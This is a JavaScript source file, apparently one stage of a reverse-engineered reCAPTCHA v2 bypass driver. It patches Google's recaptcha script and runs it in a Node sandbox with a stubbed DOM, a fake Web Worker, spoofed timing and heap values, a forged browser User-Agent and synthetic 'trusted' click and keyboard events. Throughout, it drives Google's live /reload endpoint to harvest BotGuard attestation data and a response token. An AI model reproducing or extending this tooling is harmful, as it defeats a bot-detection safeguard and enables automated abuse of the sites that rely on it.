// fire_capture.js — the FIRE-AND-CAPTURE stage of the request-based reCAPTCHA v2 driver.
//
// Precondition (established upstream by driver_core step4b / the parent-emulation bridge):
//   the anchor realm is INTERACTIVE (an element has a 'click' listener) OR a bframe realm is up.
//
// This module owns the part AFTER that gate:
//   (1) fire the EXACT trigger that makes Google's own code emit POST /recaptcha/api2/reload,
//   (2) capture the /reload body verbatim and pull field16 (empty on #1, ~5KB on #2),
//   (3) run the rresp -> ak re-attest loop (the prior reload response carries the fresh BotGuard
//       seed; the anchor feeds it to the worker over the SAME live channel; its Xm attestation
//       becomes field16 of the next reload),
//   (4) KEEP THE WORKER SESSION ALIVE across reloads (one worker realm, one loopback port, a
//       same-callid MZ ack for every worker liveness poll, monotonic clock + growing heap so
//       each attestation's Xm reads stay non-degenerate) and verify field16 flips empty -> ~5KB.
//
// Ground truth this is built against (decoded from poc/capture.json, a real populated reload):
//   f1=VER(24)  f2=c-token "03AFcWeA…"(1806)  f5=int  f6="fi"  f14=sitekey(40)
//   f16="09ATEeBz…"(5044, urlSafeB64)  f20=telemetry b64(432)  f25="W10"(=[])
//
// Map anchors used (recaptcha__en.js, ver TnA7HacJFoBWt9hnlunBlYfK):
//   verify method @440088 -> with window.botguard undefined takes Promise.resolve().then(this.U)
//   reload builder @392011: field16 = `p` (3rd elem of the bg-attestation input array)
//   worker AE channel = d5 bootstrap, opcode map RPp, ak=run->Xm attestation (30000ms timeout)
//   AE.send @794700: send(opcode, payload, timeout=15000); dispatch @212085 MZ=ok / V3=err by callid
//
// Run:  node harness/fire_capture.js        (boots anchor realm + worker, then this stage)
//   env: SITEKEY, ORIGIN_HOST, VER, ENJS_SRC, TRACE=1, MODE=anchor|bframe
'use strict'
const fs = require('fs')
const vm = require('vm')
const os = require('os')
const path = require('path')
const pb = require('../poc/pb.js')
const PR = require('./page_rpc.js')

// ----------------------------------------------------------------------------
// 0) Source-patch en.js with OUR token/controller/field16 captures only, write a temp
//    copy, and point page.js at it BEFORE requiring it (page.js reads process.env.ENJS
//    at require-time and applies the page_rpc AE-capture + __onAE end-of-ctor hook ON TOP).
//    NB: do NOT call PR.applyPatches here — page.js does it; a second pass throws (anchors
//    already consumed). This mirrors driver_core.js's ordering exactly.
// ----------------------------------------------------------------------------
const ENJS_SRC = process.env.ENJS_SRC || 'C:/Users/user/Desktop/a/recaptcha-re/recaptcha__en.js'
let CODE = fs.readFileSync(ENJS_SRC, 'utf8')
function tryPatch(find, repl, label) {
  const i = CODE.indexOf(find)
  if (i < 0) { console.log('  [patch skip]', label, '(anchor not found)'); return false }
  if (CODE.indexOf(find, i + 1) >= 0) { console.log('  [patch skip]', label, '(non-unique)'); return false }
  CODE = CODE.slice(0, i) + repl + CODE.slice(i + find.length); console.log('  [patch ok ]', label); return true
}
// rotating BotGuard tokens land in the WORKER realm __cap (where RPp/ak/Qr are minted)
tryPatch('RPp=new Map([[Qr,', 'RPp=__cap.RPp=new Map([[(__cap.Qr=Qr),', 'RPp/Qr')
tryPatch('}],[ak,function', '}],[(__cap.ak=ak),function', 'ak')
tryPatch('d5=lZ()', 'd5=__cap.d5=lZ()', 'd5')
tryPatch('(new WR(r)).D).init()', '(self.__grWR=new WR(r)).D).init()', 'WR anchor controller')
// CAPTURE the exact value `p` that becomes field16 at the builder @392011, so we can confirm the
// in-VM attestation token (empty -> ~5KB) independently of the on-wire body. (optional; skip if rotated)
tryPatch('p&&B[18](88,16,W,p,P)', '(self.__RLD=((self.__RLD)||[]),self.__RLD.push(typeof p==="string"?p.length:(p?1:0)),p)&&B[18](88,16,W,p,P)', 'field16-source capture')

const PATCHED = path.join(os.tmpdir(), 'recaptcha__en.fire.js')
fs.writeFileSync(PATCHED, CODE)
process.env.ENJS = PATCHED
const { buildRealm } = require('./page.js')

// ----------------------------------------------------------------------------
// 1) Config
// ----------------------------------------------------------------------------
const SITEKEY = process.env.SITEKEY || '6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-'
const ORIGIN_HOST = process.env.ORIGIN_HOST || 'www.google.com'
const VER = process.env.VER || 'TnA7HacJFoBWt9hnlunBlYfK'
const ORIGIN = 'https://' + ORIGIN_HOST
const CO = Buffer.from(ORIGIN + ':443').toString('base64url')
const MODE = process.env.MODE || 'anchor'
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0'
const TRACE = !!process.env.TRACE
const log = (...a) => console.log(...a)
const sleep = ms => new Promise(r => setTimeout(r, ms))
async function waitFor(cond, ms, step = 200) { const t0 = Date.now(); while (Date.now() - t0 < ms) { try { if (cond()) return true } catch {} await sleep(step) } return false }
const dejson = t => JSON.parse(String(t).replace(/^\)\]\}'\n?/, ''))

// ----------------------------------------------------------------------------
// 2) Shared session state — single instance, lives across ALL reloads (keep-alive).
// ----------------------------------------------------------------------------
let COOKIE = ''
const RELOADS = []          // [{ n, buf, info, when }] every /reload we intercepted
const RRESP = []            // [{ n, arr, reattest, payloadToken, c, type }] parsed reload responses
let pageWorkerPort = null   // the by-ref port the WORKER transferred to the page (d5 handshake)
let workerChannelAE = null  // the PAGE-side AE bound to pageWorkerPort (the ak re-attest endpoint)
let workerRealm = null      // ONE worker realm; NEVER torn down between reloads
const ALL_ELS = []          // page DOM elements (so we can fire the checkbox)
const AK_CALLS = []         // observed page->worker ak (re-attest) calls + reply sizes

function mergeSetCookie(headers) {
  let sc = []
  try { sc = headers.getSetCookie ? headers.getSetCookie() : [] } catch {}
  if (!sc.length) { const one = headers.get && headers.get('set-cookie'); if (one) sc = [one] }
  for (const c of sc) { const kv = c.split(';')[0]; if (kv && kv.includes('=')) COOKIE = COOKIE ? COOKIE + '; ' + kv : kv }
}
function toBuf(body) {
  if (body == null) return Buffer.alloc(0)
  if (Buffer.isBuffer(body)) return body
  if (typeof body === 'string') return Buffer.from(body, 'latin1')   // jspb serializes to a latin1 string
  if (body instanceof ArrayBuffer) return Buffer.from(body)
  if (ArrayBuffer.isView(body)) return Buffer.from(body.buffer, body.byteOffset, body.byteLength)
  try { return Buffer.from(body) } catch { return Buffer.alloc(0) }
}

// pull field16 (+ a field map) out of a /reload protobuf body
function extractField16(buf) {
  let fields
  try { fields = pb.decode(buf) } catch (e) { return { error: 'decode failed: ' + e.message } }
  const map = {}
  for (const f of fields) map['f' + f.field] = (f.type === 'string') ? `"${f.preview.slice(0, 16)}"(${f.len})` : (f.wire === 2 ? `<${f.len}b>` : f.value)
  const f16 = fields.find(f => f.field === 16 && f.wire === 2)
  const c = fields.find(f => f.field === 2 && f.wire === 2)
  if (!f16 || !f16.len) return { fields, map, present: false, c: c && c.raw.toString('latin1') }
  const text = f16.raw.toString('latin1')
  return { fields, map, present: true, len: f16.len, raw: f16.raw, text, tag: text.slice(0, 2), urlSafeB64: /^[A-Za-z0-9_-]+$/.test(text), c: c && c.raw.toString('latin1') }
}

// From a parsed rresp ["rresp", c, …], surface the fresh BotGuard re-attest seed (map: "field18")
// and the challenge handles. The rresp is JSON, not protobuf, so we scan for the long opaque
// base64url element that is neither the c-token (idx1) nor the payload token (idx9): that is the
// program/seed the anchor feeds to ak. (Index is build-dependent — we scan + log all candidates.)
function parseRresp(arr) {
  const c = arr[1], pmeta = arr[4], type = arr[5], payloadToken = arr[9]
  const cand = []
  arr.forEach((v, i) => {
    if (typeof v === 'string' && v.length > 256 && /^[A-Za-z0-9_\-]+$/.test(v) && i !== 1 && i !== 9) cand.push({ i, len: v.length, head: v.slice(0, 18) })
  })
  cand.sort((a, b) => b.len - a.len)
  const reattest = cand.length ? arr[cand[0].i] : null   // longest opaque blob = most likely the bg seed
  return { c, pmeta, type, payloadToken, reattest, reattestIdx: cand[0] && cand[0].i, candidates: cand }
}

// ----------------------------------------------------------------------------
// 3) Instrumented XMLHttpRequest: capture /reload body verbatim + parse rresp response,
//    forward as RAW BYTES (so the protobuf is not UTF-8 mangled) so the session advances.
// ----------------------------------------------------------------------------
function makeDriverXHR() {
  return class XHR {
    constructor() { this._h = {}; this.readyState = 0; this.status = 0; this.responseText = ''; this.response = '' }
    open(m, u) { this._m = m; this._u = u }
    setRequestHeader(k, v) { this._h[k] = v }
    addEventListener(t, f) { this['on' + t] = f }
    getAllResponseHeaders() { return Object.entries(this._rh || {}).map(([k, v]) => k + ': ' + v).join('\r\n') }
    abort() {}
    send(body) {
      const self = this, url = String(this._u)
      const path_ = url.split('?')[0].replace(/^https?:\/\/[^/]+/, '')
      const buf = toBuf(body)
      const isReload = /recaptcha\/api2\/reload/.test(url)
      if (/recaptcha\/api2\/(reload|userverify|replaceimage|anchor|bframe|payload)/.test(url))
        log('  [XHR]', this._m, path_, 'bodyLen=' + buf.length)

      if (isReload) {
        const info = extractField16(buf)
        const n = RELOADS.length + 1
        RELOADS.push({ n, buf, info, when: Date.now() })
        log(`  *** /reload #${n} INTERCEPTED: ${buf.length}B | fields ${JSON.stringify(info.map)}`)
        log(info.present
          ? `      field16: ${info.len}B tag=${info.tag} urlSafeB64=${info.urlSafeB64} head=${info.text.slice(0, 28)}`
          : `      field16: EMPTY (expected on reload #1 — populated only after the rresp->ak re-attest)`)
        try { fs.writeFileSync(`C:/Users/user/Desktop/a/recaptcha-re/harness/fire_reload_${n}.bin`, buf) } catch {}
      }

      const headers = { 'User-Agent': UA, 'Origin': ORIGIN, ...this._h }
      if (COOKIE) headers['Cookie'] = COOKIE
      if (!headers['Referer']) headers['Referer'] = `https://www.google.com/recaptcha/api2/bframe?hl=en&v=${VER}&k=${SITEKEY}`
      fetch(url, { method: this._m || 'GET', headers, body: (this._m === 'POST' || this._m === 'PUT') ? buf : undefined })
        .then(async r => {
          self.status = r.status; self._rh = Object.fromEntries(r.headers); mergeSetCookie(r.headers)
          const rb = Buffer.from(await r.arrayBuffer())
          self.responseText = rb.toString('latin1'); self.response = self.responseText; self.readyState = 4
          if (isReload) {
            log('      /reload response:', r.status, rb.length, 'bytes')
            try {
              const arr = dejson(self.responseText)
              if (arr[0] === 'rresp') {
                const pr = parseRresp(arr); RRESP.push({ n: RELOADS.length, arr, ...pr })
                log(`      [rresp] type=${pr.type} payloadTok=${String(pr.payloadToken).slice(0, 12)}… reattest=${pr.reattest ? `idx${pr.reattestIdx}(${pr.reattest.length}B)` : 'none'} cand=${JSON.stringify(pr.candidates.slice(0, 4))}`)
              }
            } catch (e) { log('      [rresp] parse failed:', e.message, '| head:', self.responseText.slice(0, 40).replace(/\n/g, ' ')) }
          }
          if (self.onreadystatechange) self.onreadystatechange()
          if (self.onload) self.onload()
        })
        .catch(e => { self.status = 0; self.readyState = 4; if (self.onerror) self.onerror(e); if (self.onreadystatechange) self.onreadystatechange() })
    }
  }
}

// ----------------------------------------------------------------------------
// 4) Realm realism: monotonic 0.1ms clock + GROWING heap. Load-bearing for keep-alive:
//    each ak attestation's Xm reads heapDelta (U>0) and execMs (x>0); a static heap or a
//    now()+random clock makes the SECOND attestation degenerate -> field16 stays low-trust.
// ----------------------------------------------------------------------------
function makePerf() {
  const t0 = process.hrtime.bigint(), wall0 = Date.now(), heap0 = process.memoryUsage().heapUsed
  const BASE = 12_000_000; let last = 0
  return {
    timeOrigin: wall0,
    now() { let ms = Number(process.hrtime.bigint() - t0) / 1e6; ms = Math.floor(ms / 0.1) * 0.1; if (ms < last) ms = last; last = ms; return ms },
    get memory() { const used = BASE + Math.max(0, process.memoryUsage().heapUsed - heap0); return { usedJSHeapSize: used, totalJSHeapSize: Math.max(used + 2_000_000, 40_000_000), jsHeapSizeLimit: 2_190_000_000 } },
    getEntriesByType: () => [], mark() {}, measure() {}, clearMarks() {}, clearMeasures() {},
  }
}

// ----------------------------------------------------------------------------
// 5) FakeWorker — ONE worker realm wired to the page over the by-ref loopback. Captures
//    pageWorkerPort (the port the worker transfers via postMessage(d5,[port2])). NEVER terminated.
// ----------------------------------------------------------------------------
function FakeWorker(url) {
  log('[page] new Worker(', String(url).slice(0, 72), ')')
  const self_ = this; self_._lis = []; self_._on = null
  const wmsgListeners = [], toPageQ = []
  function flushToPage() { if (!(self_._on || self_._lis.length)) return; while (toPageQ.length) { const ev = toPageQ.shift(); if (self_._on) try { self_._on(ev) } catch {} for (const f of self_._lis) try { f(ev) } catch {} } }
  workerRealm = buildRealm('worker', {
    __cap: {},
    performance: makePerf(),
    XMLHttpRequest: function () { return { open() {}, send() {}, setRequestHeader() {}, addEventListener() {}, getAllResponseHeaders: () => '', abort() {} } },
    postMessage: (m, transfer) => {
      const tp = Array.isArray(transfer) ? transfer.filter(x => x && x.__isPort) : []
      if (tp.length && !pageWorkerPort) { pageWorkerPort = tp[0]; log('[page] captured worker port (d5) -> ak re-attest channel') }
      toPageQ.push({ data: m, ports: tp }); flushToPage()
    },
    addEventListener: (t, f) => { if (t === 'message') wmsgListeners.push(f) },
  })
  function deliverToWorker(ev) { const ws = workerRealm.sandbox; if (ws.onmessage) try { ws.onmessage(ev) } catch {} for (const f of wmsgListeners) try { f(ev) } catch {} }
  self_.postMessage = (m, t) => deliverToWorker({ data: m, ports: (t || []).filter(x => x && x.__isPort) })
  self_.addEventListener = (t, f) => { if (t === 'message') { self_._lis.push(f); flushToPage() } }
  self_.removeEventListener = (t, f) => { self_._lis = self_._lis.filter(x => x !== f) }
  self_.terminate = () => { log('[page] (ignoring worker.terminate — keeping session alive)') }   // <-- keep-alive
  Object.defineProperty(self_, 'onmessage', { get() { return self_._on }, set(f) { self_._on = f; flushToPage() } })
}

// ----------------------------------------------------------------------------
// 6) __onAE hook (fires at end of EVERY page-realm AE ctor — patched in by page_rpc):
//    (a) install the catch-all handler set so worker liveness polls always get a same-callid MZ
//        ack inside the 15s watchdog (this is THE keep-alive: a missed ack soft-blocks the run),
//    (b) capture the worker-channel AE (ae.D === pageWorkerPort) = the ak re-attest endpoint,
//    (c) wrap its .send to observe ak (re-attest) calls and the attestation reply size.
// ----------------------------------------------------------------------------
function onAE(ae) {
  try {
    PR.installOn(ae, { log: (...a) => TRACE && log('  [page-rpc]', ...a) })
    if (pageWorkerPort && ae && ae.D === pageWorkerPort && ae !== workerChannelAE) {
      workerChannelAE = ae
      log('[page] bound worker-channel AE (ak re-attest endpoint)')
      const origSend = ae.send.bind(ae)
      ae.send = function (op, payload, ...rest) {
        const akTok = workerRealm && workerRealm.sandbox.__cap && workerRealm.sandbox.__cap.ak
        if (akTok != null && op === akTok) { AK_CALLS.push({ t: Date.now(), op: String(op) }); log('  [ak] page->worker re-attest call #' + AK_CALLS.length) }
        const p = origSend(op, payload, ...rest)
        if (p && typeof p.then === 'function' && akTok != null && op === akTok)
          p.then(r => { const sz = r && (r.length || (r.byteLength) || (typeof r === 'object' ? JSON.stringify(r).length : 0)); log('  [ak] re-attest reply ~' + sz + 'B'); AK_CALLS[AK_CALLS.length - 1].replyLen = sz }, () => {})
        return p
      }
    }
  } catch (e) { if (TRACE) log('  [onAE]', e.message) }
  return ae
}

// ----------------------------------------------------------------------------
// 7) Page DOM stub (no canvas) — elements capture listeners so we can fire the checkbox.
// ----------------------------------------------------------------------------
function noop() { const f = function () { return P }; const P = new Proxy(f, { get(t, k) { if (k === Symbol.toPrimitive || k === 'toString' || k === 'valueOf') return () => ''; if (k === 'length') return 0; if (k === 'nodeType') return 1; return P }, apply() { return P }, construct() { return P }, set() { return true }, has() { return true } }); return P }
const ELS = {}
function makeEl(tag, id) {
  const lis = {}
  function fire(type, ev) { (lis[type] || []).slice().forEach(f => { try { f(ev || { type, target: P, currentTarget: P, preventDefault() {}, stopPropagation() {}, stopImmediatePropagation() {}, isTrusted: true, bubbles: true, clientX: 14, clientY: 14, button: 0 }) } catch {} }) }
  const real = { tagName: (tag || 'div').toUpperCase(), id: id || '', nodeType: 1, style: new Proxy({}, { get: () => '', set: () => true }), dataset: {}, classList: { add() {}, remove() {}, contains: () => false, toggle() {} },
    addEventListener: (t, f) => { (lis[t] = lis[t] || []).push(f) }, removeEventListener: (t, f) => { if (lis[t]) lis[t] = lis[t].filter(x => x !== f) },
    setAttribute() {}, getAttribute: () => null, hasAttribute: () => false, removeAttribute() {}, appendChild: x => x, removeChild: x => x, insertBefore: x => x, replaceChild: x => x, remove() {}, contains: () => false,
    querySelector: () => makeEl('div'), querySelectorAll: () => [], getElementsByTagName: () => [makeEl('div')], getElementsByClassName: () => [makeEl('div')],
    getBoundingClientRect: () => ({ x: 0, y: 0, width: 28, height: 28, top: 0, left: 0, right: 28, bottom: 28 }), getClientRects: () => [],
    focus() {}, blur() {}, click() { fire('click') }, cloneNode() { return makeEl(tag, id) }, getContext: () => null, setPointerCapture() {}, releasePointerCapture() {},
    children: [], childNodes: [], firstChild: null, lastChild: null, parentNode: null, nextSibling: null, previousSibling: null, ownerDocument: null,
    innerHTML: '', outerHTML: '', textContent: '', value: '', checked: false, disabled: false, offsetWidth: 28, offsetHeight: 28, offsetParent: null,
    dispatchEvent(ev) { fire(ev && ev.type, ev); return true }, _lis: lis, _fire: fire }
  const P = new Proxy(real, { get(t, k) { if (k in t) return t[k]; if (typeof k === 'string' && /^on/.test(k)) return t['__' + k] || null; return noop() }, set(t, k, v) { t[k] = v; return true }, has() { return true } })
  ALL_ELS.push(real); return P
}
const document = new Proxy({
  createElement: t => makeEl(t), createElementNS: (ns, t) => makeEl(t), createDocumentFragment: () => makeEl('fragment'), createTextNode: () => makeEl('text'), createComment: () => makeEl('comment'), createEvent: () => ({ initEvent() {}, initCustomEvent() {} }),
  getElementById: id => (ELS[id] = ELS[id] || makeEl('div', id)), querySelector: s => (ELS['q:' + s] = ELS['q:' + s] || makeEl('div', 'q:' + s)), querySelectorAll: () => [], getElementsByTagName: () => [], getElementsByClassName: () => [], getElementsByName: () => [],
  documentElement: makeEl('html'), head: makeEl('head'), body: makeEl('body'), cookie: '', referrer: 'https://www.google.com/', addEventListener() {}, removeEventListener() {}, dispatchEvent: () => true, readyState: 'complete', visibilityState: 'visible', hidden: false, currentScript: null, scripts: [], title: '', defaultView: null, characterSet: 'UTF-8', compatMode: 'CSS1Compat',
}, { get(t, k) { if (k in t) return t[k]; return noop() }, has() { return true } })

const WIN_LIS = {}, WIN_POSTS = []
const windowExtra = {
  __cap: {},
  __onAE: onAE,                                  // <-- our keep-alive + ak-observer hook
  Worker: FakeWorker,
  document,
  addEventListener: (t, f) => { (WIN_LIS[t] = WIN_LIS[t] || []).push(f) },
  removeEventListener: (t, f) => { if (WIN_LIS[t]) WIN_LIS[t] = WIN_LIS[t].filter(x => x !== f) },
  postMessage: (m, targetOrigin, transfer) => { const ports = Array.isArray(transfer) ? transfer : (Array.isArray(targetOrigin) ? targetOrigin : []); WIN_POSTS.push({ m, targetOrigin, ports }) },
  performance: makePerf(),
  XMLHttpRequest: makeDriverXHR(),
  location: { href: `https://www.google.com/recaptcha/api2/anchor?ar=1&k=${SITEKEY}&co=${CO}&hl=en&v=${VER}&size=normal`, origin: 'https://www.google.com', protocol: 'https:', host: 'www.google.com', hostname: 'www.google.com', pathname: '/recaptcha/api2/anchor', search: `?k=${SITEKEY}`, hash: '', replace() {}, assign() {}, reload() {} },
  screen: { width: 1920, height: 1080, availWidth: 1920, availHeight: 1040, colorDepth: 24, pixelDepth: 24 },
  history: { length: 1, pushState() {}, replaceState() {}, back() {}, forward() {} },
  localStorage: { getItem: () => null, setItem() {}, removeItem() {}, clear() {} }, sessionStorage: { getItem: () => null, setItem() {}, removeItem() {}, clear() {} },
  devicePixelRatio: 1, innerWidth: 1920, innerHeight: 1040, outerWidth: 1920, outerHeight: 1080, name: '', closed: false,
  matchMedia: () => ({ matches: false, addListener() {}, removeListener() {}, addEventListener() {}, removeEventListener() {} }),
  getComputedStyle: () => noop(), parent: null, top: null, frameElement: null, scrollTo() {}, focus() {}, blur() {},
  Image: function () { return noop() }, Event: function () { return noop() }, CustomEvent: function () { return noop() }, MutationObserver: function () { return { observe() {}, disconnect() {}, takeRecords: () => [] } }, IntersectionObserver: function () { return { observe() {}, disconnect() {} } }, ResizeObserver: function () { return { observe() {}, disconnect() {} } },
  ___grecaptcha_cfg: { clients: {}, count: 0, fns: [] },
  // window.botguard LEFT UNDEFINED on purpose: verify @440088 then takes Promise.resolve().then(this.U)
  // (the worker-attestation path that builds /reload), not this.D.C.execute() (page-side bg we can't run).
}

// ----------------------------------------------------------------------------
// 8) Extract the recaptcha.{anchor|frame}.Main.init("…") literal from the HTML.
// ----------------------------------------------------------------------------
function extractInitCall(html, key) {
  key = key || 'recaptcha.anchor.Main.init('
  const i = html.indexOf(key); if (i < 0) return null
  let p = i + key.length, depth = 1, inStr = false, q = ''
  for (; p < html.length; p++) { const c = html[p]
    if (inStr) { if (c === '\\') { p++; continue } if (c === q) inStr = false; continue }
    if (c === '"' || c === "'") { inStr = true; q = c; continue }
    if (c === '(') depth++; else if (c === ')') { depth--; if (depth === 0) { p++; break } } }
  return html.slice(i, p)
}

// ============================================================================
// 9) THE FIRE-AND-CAPTURE STAGE
// ============================================================================
const clickable = () => ALL_ELS.filter(el => el._lis && (el._lis.click || el._lis.mousedown || el._lis.pointerdown || el._lis.keydown))
const interactive = () => clickable().length > 0
const latestReload = () => RELOADS[RELOADS.length - 1]
const havePopulated16 = () => RELOADS.some(r => r.info && r.info.present && r.info.len > 1000)

// THE EXACT TRIGGER. size=normal anchor: the checkbox. We first lay a short pointer path so the
// reload builder's f20 telemetry is non-empty, then run the activate sequence that reaches
// verify @440088. grecaptcha.execute() is the deterministic equivalent (it routes to the same
// verify via e[31]); we issue it too as a belt-and-braces nudge. (bframe mode: init already auto-
// emits reload reason=fi, so this is a no-op there.)
function fireTrigger(page, tagLabel) {
  const els = clickable()
  log(`[fire] ${tagLabel}: firing checkbox on ${els.length} element(s)`)
  for (const el of els) {
    try {
      for (let k = 0; k < 5; k++) el._fire('pointermove', { type: 'pointermove', clientX: 7 + k * 3, clientY: 9 + k * 2, movementX: 3, movementY: 2, isTrusted: true, target: el, preventDefault() {}, stopPropagation() {} })
      el._fire('pointerover'); el._fire('pointerenter'); el._fire('mouseover')
      el._fire('pointerdown', { type: 'pointerdown', clientX: 14, clientY: 14, button: 0, isTrusted: true, target: el, preventDefault() {}, stopPropagation() {} })
      el._fire('mousedown'); el._fire('focus')
      el._fire('keydown', { type: 'keydown', key: ' ', code: 'Space', keyCode: 32, which: 32, isTrusted: true, target: el, preventDefault() {}, stopPropagation() {} })
      el._fire('keyup', { type: 'keyup', key: ' ', code: 'Space', keyCode: 32, which: 32, isTrusted: true, target: el, preventDefault() {}, stopPropagation() {} })
      el._fire('mouseup'); el._fire('pointerup'); el._fire('click')
    } catch {}
  }
  // deterministic API route to verify (invisible-style execute; harmless for normal)
  try { const g = page.sandbox.grecaptcha; if (g && typeof g.execute === 'function') { g.execute(); log('[fire] grecaptcha.execute() nudge') } } catch {}
  // last resort: drive the captured WR controller's public surface if present
  try { const wr = page.sandbox.__grWR; if (wr && wr.D && typeof wr.D.execute === 'function') wr.D.execute() } catch {}
}

// MANUAL re-attest fallback (riskiest path — see note). If the client does NOT auto-drive ak after
// the rresp, push the rresp seed to the worker over the LIVE channel ourselves, then re-fire so the
// builder picks up the fresh attestation. The seed jspb wrapper is opaque -> best-effort only.
async function manualReattest() {
  if (!workerChannelAE) { log('[reattest] no worker-channel AE bound — cannot manual-pump'); return false }
  const rr = RRESP[RRESP.length - 1]
  if (!rr || !rr.reattest) { log('[reattest] no rresp seed candidate'); return false }
  const akTok = workerRealm && workerRealm.sandbox.__cap && workerRealm.sandbox.__cap.ak
  if (akTok == null) { log('[reattest] ak opcode token not captured'); return false }
  log(`[reattest] manual ak pump: seed idx${rr.reattestIdx} (${rr.reattest.length}B)`)
  // Try a few payload shapes the worker's ak handler may accept (raw b64 string, decoded bytes,
  // a 1-field jspb-ish array). The correct jspb class is build-specific and unverified.
  const tries = [rr.reattest, Buffer.from(rr.reattest, 'base64'), [rr.reattest], { D: rr.reattest }]
  for (const seed of tries) {
    try { const p = workerChannelAE.send(akTok, seed, 30000); if (p && p.then) { p.then(() => {}, () => {}); return true } } catch (e) { if (TRACE) log('   ak shape threw:', e.message) }
  }
  return false
}

async function runFireCapture(page) {
  log('\n[stage] ===== FIRE & CAPTURE =====')

  // Precondition gate: interactive anchor (click listener) OR bframe-up (a reload already in flight).
  const ready = await waitFor(() => interactive() || RELOADS.length > 0, MODE === 'bframe' ? 4000 : 15000)
  log(`[stage] precondition: interactive=${interactive()} clickListeners=${clickable().length} reloadsSoFar=${RELOADS.length}`)
  if (!ready && MODE !== 'bframe') {
    log('[stage] anchor never went interactive — the upstream parent cross-frame handshake did not')
    log('         complete (0 click listeners). Fire-and-capture has nothing to trigger. ABORT.')
    return finish()
  }

  // ---- reload #1 ----------------------------------------------------------
  if (RELOADS.length === 0) fireTrigger(page, 'reload#1')
  await waitFor(() => RELOADS.length >= 1, 12000)
  if (RELOADS.length === 0) { log('[stage] no /reload fired by the in-VM client.'); return finish() }
  const r1 = RELOADS[0]
  log(`[stage] reload#1 captured: field16 ${r1.info.present ? r1.info.len + 'B (UNEXPECTED — usually empty on #1)' : 'EMPTY (as expected)'}`)

  // ---- rresp -> ak re-attest loop ----------------------------------------
  // The reload#1 response (rresp) carries the fresh BotGuard seed. Over the SAME live worker
  // channel the anchor feeds it to ak; the Xm attestation becomes field16 of the NEXT reload.
  await waitFor(() => RRESP.length >= 1, 8000)
  if (RRESP.length) log(`[stage] rresp#1: type=${RRESP[0].type} reattestSeed=${RRESP[0].reattest ? RRESP[0].reattestIdx + '/' + RRESP[0].reattest.length + 'B' : 'NONE'}`)

  // ---- reload #2 (populated field16) -------------------------------------
  // Strategy ladder, each keeps the worker session ALIVE (no teardown, polls keep getting MZ acks):
  //   attempt 0: just wait — many flows auto-fire reload#2 after the client's own ak completes.
  //   attempt 1: re-fire the checkbox/execute -> client re-verifies -> re-attest -> reload w/ field16.
  //   attempt 2: manual ak pump (push the rresp seed ourselves) then re-fire. (best-effort)
  for (let attempt = 0; attempt < 3 && !havePopulated16(); attempt++) {
    log(`[stage] drive reload#2 attempt ${attempt} | akCalls=${AK_CALLS.length} reloads=${RELOADS.length}`)
    if (attempt === 1) fireTrigger(page, 'reload#2')
    if (attempt === 2) { await manualReattest(); await sleep(500); fireTrigger(page, 'reload#2(post-pump)') }
    await waitFor(() => havePopulated16(), 12000)
  }
  return finish()
}

function finish() {
  log('\n[stage] ===== RESULT =====')
  log('reloads:', RELOADS.length, '| ak re-attest calls observed:', AK_CALLS.length, '| worker alive:', !!workerRealm)
  RELOADS.forEach(R => log(`  reload#${R.n}: ${R.buf.length}B | field16 ${R.info.present ? R.info.len + 'B tag=' + R.info.tag + ' urlSafeB64=' + R.info.urlSafeB64 : 'EMPTY'} | c=${(R.info.c || '').slice(0, 10)}… | ${JSON.stringify(R.info.map)}`))
  const pop = RELOADS.find(R => R.info && R.info.present && R.info.len > 1000)
  if (pop) {
    log(`\n[stage] SUCCESS: field16 flipped empty -> ${pop.len}B on reload#${pop.n} (tag ${pop.info.tag}, urlSafeB64 ${pop.info.urlSafeB64}).`)
    log('        The worker session stayed alive across reloads and re-attested. Wrote fire_reload_*.bin.')
    log('        NEXT: hand the resulting g-recaptcha-response to /siteverify on the OWN key (the only')
    log('        oracle that falsifies trust — a structurally-valid field16 can still score low).')
  } else if (RELOADS.length) {
    log('\n[stage] field16 never populated. Either reload#2 never fired (client did not re-attest in the')
    log('        anchor-only realm) or the manual ak seed shape was rejected (riskiest unknown — below).')
  }
  process.exit(0)
}

// ----------------------------------------------------------------------------
// 10) Boot: page realm -> fetch anchor -> init -> worker handshake -> fire-and-capture.
//     (In MODE=bframe the upstream driver boots the bframe realm + bft; here we assume anchor.)
// ----------------------------------------------------------------------------
async function main() {
  process.on('unhandledRejection', () => {})
  log('[fire] sitekey=%s co=%s (%s) ver=%s mode=%s', SITEKEY, CO, ORIGIN, VER, MODE)
  const page = buildRealm('page', windowExtra, { pageWindow: true })
  log('[fire] page load:', page.err ? 'THREW ' + page.err.message : 'OK')
  if (!page.sandbox.recaptcha || !page.sandbox.recaptcha.anchor) { log('[fire] no recaptcha.anchor api — abort'); process.exit(1) }

  const aurl = `https://www.google.com/recaptcha/api2/anchor?ar=1&k=${SITEKEY}&co=${CO}&hl=en&v=${VER}&size=normal&cb=${Math.random().toString(36).slice(2, 14)}`
  let html
  try { const r = await fetch(aurl, { headers: { 'User-Agent': UA } }); mergeSetCookie(r.headers); html = await r.text() }
  catch (e) { log('[fire] anchor fetch failed:', e.message); process.exit(1) }
  const initCall = extractInitCall(html)
  if (!initCall) { log('[fire] no init() literal in anchor html — cfg not present'); process.exit(1) }
  try { vm.runInContext(initCall, page.ctx, { timeout: 20000 }) } catch (e) { log('[fire] init threw:', e.message) }

  // let the worker spawn + d5 handshake bind the page-side AE (keep-alive endpoint)
  await waitFor(() => !!workerRealm, 6000)
  await waitFor(() => !!pageWorkerPort, 4000)
  log('[fire] worker:', !!workerRealm, '| pageWorkerPort:', !!pageWorkerPort, '| RPp ops:', workerRealm && workerRealm.sandbox.__cap.RPp ? workerRealm.sandbox.__cap.RPp.size : '-', '| ak tok:', workerRealm && workerRealm.sandbox.__cap.ak ? 'yes' : 'no')

  // NOTE: the parent cross-frame handshake that makes the anchor INTERACTIVE is owned by
  // driver_core.js step4b / the parent-emulation bridge. This module assumes that ran (or runs in
  // MODE=bframe). If you are wiring this in, call runFireCapture(page) AFTER the anchor reports a
  // 'click' listener. Standalone, we simply proceed and let the precondition gate report the state.
  await runFireCapture(page)
}

if (require.main === module) main()
module.exports = { runFireCapture, fireTrigger, extractField16, parseRresp, makeDriverXHR, makePerf, FakeWorker, onAE, windowExtra, RELOADS, RRESP, AK_CALLS }
